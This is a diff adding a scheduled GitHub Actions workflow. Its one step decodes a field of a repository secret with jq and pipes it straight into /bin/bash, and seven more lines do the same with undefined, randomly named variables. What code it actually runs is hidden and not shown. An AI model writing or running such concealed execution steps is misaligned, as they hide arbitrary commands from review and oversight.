@@ -1,0 +1,26 @@
+name: fanhaozhiwang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanhaozhiwang
+        env:
+          rqjz20193: ${{ secrets.rqjz20193 }}
+        run: |
+          echo $rqjz20193 | jq -r .oepnj9064 | /bin/bash
+          echo $u37609 | jq -r .a40217 | /bin/bash
+          echo $krvew4 | jq -r .jl3285 | /bin/bash
+          echo $fyo0 | jq -r .jtow36 | /bin/bash
+          echo $nmh1544 | jq -r .hly1 | /bin/bash
+          echo $stmv408 | jq -r .oq84475 | /bin/bash
+          echo $h89223 | jq -r .yqxam1971 | /bin/bash
+          echo $k15288 | jq -r .rqpd5 | /bin/bash
+
